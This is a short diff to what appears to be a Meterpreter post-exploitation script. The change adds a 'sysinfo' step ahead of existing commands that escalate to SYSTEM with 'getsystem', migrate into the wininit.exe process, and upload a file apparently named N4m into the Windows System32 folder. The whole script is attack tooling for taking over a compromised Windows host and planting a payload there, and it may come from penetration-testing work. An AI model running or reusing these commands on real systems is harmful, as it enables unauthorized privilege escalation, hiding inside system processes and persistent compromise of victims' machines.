@@ -1,3 +1,4 @@
+sysinfo
 getsystem
 run migrate -n wininit.exe
 upload IPATH/output/N4m %windir%\\System32\\N4m
